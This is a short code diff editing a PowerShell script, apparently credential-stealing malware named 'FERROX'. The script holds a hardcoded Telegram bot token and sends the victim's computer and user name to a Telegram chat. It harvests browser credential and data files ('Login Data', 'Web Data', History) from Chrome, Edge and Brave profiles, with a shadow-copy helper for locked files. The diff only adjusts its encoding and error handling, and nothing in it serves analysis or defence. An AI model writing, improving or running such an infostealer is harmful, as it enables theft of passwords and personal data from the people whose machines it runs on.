@@ -3,9 +3,9 @@ $BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
 $CI="8468737863"
 
 function TG($t){
-    $txt=[System.Web.HttpUtility]::UrlEncode($t)
+    $txt=$t -replace '#','%23' -replace '&','%26' -replace '\+','%2B'
     $u="https://api.telegram.org/bot$BT/sendMessage?chat_id=$CI&text=$txt"
-    try{(Invoke-WebRequest $u -UseBasicParsing -TimeoutSec 10)|Out-Null}catch{}
+    try{Invoke-WebRequest $u -UseBasicParsing -TimeoutSec 10|Out-Null}catch{}
 }
 
 TG "FERROX: $env:COMPUTERNAME / $env:USERNAME"
@@ -32,7 +32,7 @@ function VSS-COPY($src,$dst){
 $browsers=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
 foreach($base in $browsers){
     if(!(Test-Path $base)){continue}
-    Get-ChildItem $base -Directory -EA 0 -ErrorAction SilentlyContinue | %{
+    Get-ChildItem $base -Directory -EA 0 | %{
         $p=$_.FullName
         @("Login Data","Web Data","History","Bookmarks") | %{
             $f="$p\$_"
